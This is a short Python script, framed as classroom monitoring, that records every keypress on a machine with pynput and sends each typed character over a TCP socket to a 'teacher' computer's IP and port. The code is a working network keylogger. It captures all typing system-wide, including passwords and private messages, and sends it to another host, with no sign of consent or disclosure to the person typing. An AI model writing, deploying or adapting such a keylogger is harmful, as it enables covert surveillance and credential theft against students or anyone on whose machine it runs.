import socket
from pynput import keyboard

# IP address and port of the main teacher computer
TEACHER_IP = '127.0.0.1'  # Replace with the teacher's IP address
PORT = 12345  # Choose a port number

def keyPressed(key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            char = key.char
            key_data = char.encode()
            s.connect((TEACHER_IP, PORT))
            s.sendall(key_data)
        except AttributeError:
            # If key.char is None, it means it's a special key like Shift, Alt, etc.
            pass
        except Exception as e:
            print("Error:", e)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
